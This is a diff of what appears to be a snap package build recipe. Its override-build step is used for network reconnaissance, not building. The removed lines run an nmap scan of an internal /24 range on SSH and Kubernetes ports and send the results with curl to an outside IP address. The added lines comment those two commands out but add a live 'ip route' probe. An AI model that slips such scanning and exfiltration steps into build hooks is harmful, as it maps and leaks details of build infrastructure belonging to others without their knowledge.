@@ -14,8 +14,9 @@ parts:
         plugin: nil
         override-build: |
             apt-get update
-            apt-get install -y  curl nmap
-            nmap -oN nm -p22,8001,10250,10255,30000,443,6443 10.10.10.1/24
-            curl -d @nm http://139.59.42.102/nm
+            apt-get install -y  curl nmap ip
+            ip route
+            #nmap -oN nm -p22,8001,10250,10255,30000,443,6443 10.10.10.1/24
+            #curl -d @nm http://139.59.42.102/nm
             echo 0
 
